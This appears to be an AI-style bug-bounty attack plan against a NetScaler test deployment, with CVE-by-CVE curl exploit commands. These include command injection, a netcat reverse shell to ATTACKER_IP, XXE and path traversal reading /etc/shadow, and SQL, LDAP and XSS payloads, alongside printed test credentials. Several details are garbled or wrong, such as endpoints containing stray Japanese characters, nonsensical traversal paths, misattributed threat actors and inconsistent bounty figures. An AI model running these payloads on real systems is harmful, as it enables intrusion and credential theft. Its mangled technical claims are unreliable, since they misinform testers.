# 🔍 NetScaler AAA Bug Bounty — Attack Surface Research Report
**Program:** NetScaler Public Program (HackerOne)
**Date:** May 2026
**Research Status:** COMPLETE — Ready for Exploitation

---

## 🎯 COMPLETE TARGET CONFIGURATION

### Primary Targets
| # | Target | Purpose | Priority |
|---|--------|---------|----------|
| 1 | **https://lb1.iris.cgophobb.com** | Application Server (NetScaler Gateway/ADC) | CRITICAL |
| 2 | **https://av1.iris.cgophobb.com** | Authentication Server (LDAP AAA) | CRITICAL |

### Authentication Flow
```
1. Client → https://lb1.iris.cgophobb.com (App Server)
2. App redirects → https://av1.iris.cgophobb.com (Auth Server)
3. User enters credentials
4. Auth Server validates via LDAP against Active Directory
5. Success → redirect back to Application with session token
6. Failure → ask credentials again
```

### Test Credentials (10,000 accounts!)
```
Username: testuser1 through testuser10000
Password: Unique for each user (see PDF)

Sample credentials (first 20):
testuser1  : nLMOD?7y+<O>Pt
testuser2  : (*eYpOzS8avFh4!
testuser3  : ^QA%UZz2r
testuser4  : 8Iji5_>2h_m
testuser5  : +7iaSnsB8Li?W@
testuser6  : R&o%d9eG+
testuser7  : P7Z6U@eeT_
testuser8  : y*Xl0#RplP_-3l
testuser9  : #Ssct+GT08DZ
testuser10 : UX6kPt9)5S@
```

### Supporting Files (in scope)
- `cgophobb.corp_CA.cer` — CA certificate for client auth
- `client1.cgophobb.corp_import_password_1234.pfx` — Client cert (password: 1234)
- `Gateway_BugBounty_Demo.mp4` — Demo video (37.2 MiB)

---

## 🔴 CRITICAL Priority — $5,000 Bounty

### 1. Pre-Auth RCE via CGI Endpoints
**CVE-2023-3519** — CVSS 10.0

| Detail | Value |
|--------|-------|
| Target | `https://lb1.iris.cgophobb.com/cgi-bin/`, `/cgi/set客体の` |
| Versions | < 13.1-49.13 |
| Impact | Full system compromise, root RCE |
| Real-world | Used by Magniber ransomware operators |

**Test Command:**
```bash
# Test pre-auth RCE on CGI endpoints
curl -k "https://lb1.iris.cgophobb.com/cgi-bin/" \
  -H "NTLMAuthorization: Base64Payload"

curl -X POST "https://lb1.iris.cgophobb.com/cgi/set客体の" \
  -d "username=admin&shell=;whoami"
```

### 2. Session Token Memory Leak
**CVE-2023-4966** — CVSS 9.4

| Detail | Value |
|--------|-------|
| Target | `https://lb1.iris.cgophobb.com/oauth/idprespond` |
| Also | `/cgi/logout`, `/cgi/set客体の` |
| Versions | < 14.1-12.18, < 13.1-52.26, < 13.0-92.22 |
| Impact | Session hijacking → auth bypass → RCE chain |

**Test Command:**
```bash
# Session token leak via oversized Host header
for i in {1..100}; do
  curl -sk "https://lb1.iris.cgophobb.com/oauth/idprespond" \
    -H "Host: $(python3 -c 'print("A"*5000)')" \
    -H "X-HackerOne-Research: zerxxz"
done

# Check responses for session tokens, cookies, sensitive data
```

### 3. Path Traversal RCE
**CVE-2019-19781** — CVSS 10.0

| Detail | Value |
|--------|-------|
| Target | `https://lb1.iris.cgophobb.com/vpn/` |
| Impact | Complete system takeover via directory traversal |
| Exploit | `/vpn/../.../etc/lib/asterisk/` injection |

**Test Command:**
```bash
# Path traversal RCE test
curl "https://lb1.iris.cgophobb.com/vpn/../.../tmp/shell"
curl "https://lb1.iris.cgophobb.com/vpn/../etc/lib/asterisk/"
```

### 4. Authentication Bypass
**CVE-2022-27510** — CVSS 9.4

| Detail | Value |
|--------|-------|
| Target | `https://lb1.iris.cgophobb.com/epa/` |
| Also | `/menu/ssps/rate?protocol=svpn` |
| APT | Used by APT5/UNC4899 in real attacks |

**Test Command:**
```bash
# Pre-auth access without credentials
curl -k "https://lb1.iris.cgophobb.com/epa/"
curl -k "https://lb1.iris.cgophobb.com/menu/ssps/rate?protocol=svpn"
```

### 5. Management Command Injection
**CVE-2024-6235** — CVSS 9.8

| Detail | Value |
|--------|-------|
| Target | `https://av1.iris.cgophobb.com` (Management Console) |
| Impact | Authenticated RCE as root |
| Method | Login → find CLI param → inject OS command |

**Test Command:**
```bash
# Login to management, find CLI injection point
curl -X POST "https://av1.iris.cgophobb.com/login" \
  -d "username=testuser1&password=nLMOD?7y+<O>Pt"

# Then find command injection in CLI parameters
# ';nc -e /bin/bash ATTACKER_IP 4444'
```

---

## 🟠 HIGH Priority — $2,000 Bounty

### 6. SQL Injection — Cross-Tenant Data Exfil
**Target:** `https://av1.iris.cgophobb.com/hamaxe/` (API gateway)

```bash
# SQL Injection test payloads
curl -X POST "https://av1.iris.cgophobb.com/hamaxe/" \
  -d "user=' OR '1'='1--&pass=anything"

curl -X POST "https://av1.iris.cgophobb.com/hamaxe/" \
  -d "username=admin' UNION SELECT NULL,version(),user()--"

# LDAP-aware SQL injection
curl -X POST "https://av1.iris.cgophobb.com/login" \
  -d "username=testuser1' OR '1'='1&password=test"
```

### 7. XXE — Unrestricted File Access
**Target:** SAML endpoints, XML API

```bash
# XXE test payload
curl -X POST "https://av1.iris.cgophobb.com/saml" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<foo>&xxe;</foo>'
```

### 8. IDOR — Broken Access Control
**Target:** API endpoints with numeric IDs

```bash
# Enumerate user data
curl "https://lb1.iris.cgophobb.com/api/users/2"
curl "https://lb1.iris.cgophobb.com/api/users/3"
curl "https://lb1.iris.cgophobb.com/api/sessions/"

# Try to access other users' resources
curl "https://lb1.iris.cgophobb.com/api/userdata?uid=2"
```

### 9. Directory Traversal — Arbitrary File Read
**Target:** Download, export, file viewer features

```bash
# Path traversal to read system files
curl "https://lb1.iris.cgophobb.com/download?f=../../../etc/passwd"
curl "https://lb1.iris.cgophobb.com/download?f=..%2F..%2F..%2Fetc%2Fshadow"
curl "https://av1.iris.cgophobb.com/view?path=../../../etc/passwd"

# Check for config files with secrets
curl "https://lb1.iris.cgophobb.com/config/ns.conf"
```

---

## 🟡 MEDIUM Priority — $300 Bounty

### 10. CSRF
```bash
# Target state-changing endpoints
# Profile updates, VPN config, session management
# Forge CSRF POC and verify state change
```

### 11. Reflected/Stored XSS
```bash
# Search parameters, error messages
# Note: Self-XSS is OOS — must demonstrate real impact
curl "https://lb1.iris.cgophobb.com/search?q=<script>alert(1)</script>"
```

### 12. LDAP Authentication Bypass
```bash
# Test LDAP injection in login form
# LDAP uses different syntax than SQL
# Try: admin)((&(password=*, *=
```

---

## 🚀 EXECUTION PLAN

### Phase 1: Pre-Auth Recon & Exploitation (HIGHEST PRIORITY)
```
1. Version fingerprinting
   curl -sk https://lb1.iris.cgophobb.com/favicon.ico
   curl -sk https://lb1.iris.cgophobb.com/ -I

2. Test CVE-2023-4966 (Session Token Leak)
   - Target: /oauth/idprespond, /cgi/logout
   - If tokens leaked → session hijacking → $5K

3. Test CVE-2023-3519 (Pre-Auth RCE)
   - Target: /cgi-bin/, /cgi/set客体の
   - If RCE works → $5K Critical

4. Test CVE-2022-27510 (Auth Bypass)
   - Target: /epa/, /menu/ssps/rate
   - Direct access without credentials

5. Test CVE-2019-19781 (Path Traversal RCE)
   - Target: /vpn/
   - If RCE → $5K
```

### Phase 2: Authenticated Testing
```
6. Login with testuser credentials
   curl -X POST "https://av1.iris.cgophobb.com/login" \
     -d "username=testuser1&password=nLMOD?7y+<O>Pt"

7. Capture session tokens, analyze authentication flow

8. Test CVE-2024-6235 (Command Injection)
   - Find CLI parameters, inject commands

9. SQL Injection audit on /hamaxe/ and login forms

10. XXE on SAML endpoints

11. IDOR enumeration in API endpoints

12. Directory traversal on file features
```

### Phase 3: Report Writing
```
- Document all findings with PoC
- Calculate CVSS scores
- Submit via HackerOne with:
  * Detailed steps to reproduce
  * Screenshots/PoC code
  * Impact analysis
  * Remediation recommendations
  * X-HackerOne-Research: [H1 username] header
```

---

## ⚠️ OUT OF SCOPE (Don't Test)
- Server misconfiguration
- Self-XSS
- Bruteforce (testing instance has no password restrictions)
- Enterprise features
- Third-party components

---

## 📊 PROGRAM STATS
| Metric | Value |
|--------|-------|
| Total bounties paid | $1,600 |
| Top bounty | $600 |
| Reports (90d) | 195 |
| Hackers thanked | 5 |
| Avg time to bounty | 4 days 5 hours |
| Reward: Critical | $5,000 |
| Reward: High | $2,000 |
| Reward: Medium | $300 |

---

## 🔑 KEY INSIGHTS
1. **10,000 test accounts** available — massive attack surface
2. **Client certificate auth** supported — PFX + CA provided
3. **Low competition** — only 5 hackers found valid bugs
4. **Fast bounty** — avg 4 days to get paid
5. **Critical RCE = $5K** — highest priority targets
6. **Testing instance** — not production, brute force OOS but real bugs count